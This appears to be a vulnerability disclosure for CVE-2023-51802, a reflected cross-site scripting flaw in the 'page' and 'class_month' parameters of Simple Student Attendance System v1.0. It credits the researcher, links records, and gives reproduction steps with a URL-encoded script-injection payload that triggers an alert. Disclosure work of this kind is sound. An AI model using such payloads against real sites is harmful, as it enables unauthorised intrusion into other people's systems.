# CVE-2023-51802
# Simple Student Attendance System v.1.0 - Cross-site scripting (XSS) vulnerabilities in attendance_report

**Description**: > Cross Site Scripting vulnerability in the Simple Student Attendance System v.1.0 allows a remote attacker to execute arbitrary code via a crafted payload to the "page" or "class_month" parameter in the attendance_report component.
 

**Vulnerable Product Version**: Simple Student Attendance System v.1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 10/01/2024  
**CVE**: CVE-2023-51802  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2023-51802  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2023-51802  
**Tenable Link**: https://www.tenable.com/cve/CVE-2023-51802  
**Tested on**: Windows   
### Steps to reproduce:  
To exploit this vulnerability, an attacker needs to access the '/php-attendance/attendance_report' page. During a search, the attacker can manipulate the vulnerable parameters passed via the URL with a malicious payload.   
**Affected Components**:   
> attendance_report - page and class_month parameters  
### Request:  
```
Payload:page=attendance_report&class_id=1&class_month=jgarv%22%3e%3cscript%3ealert(1)%3c%2fscript%3ehrldm
```
Discoverer(s)/Credits:  
Geraldo Alcântara
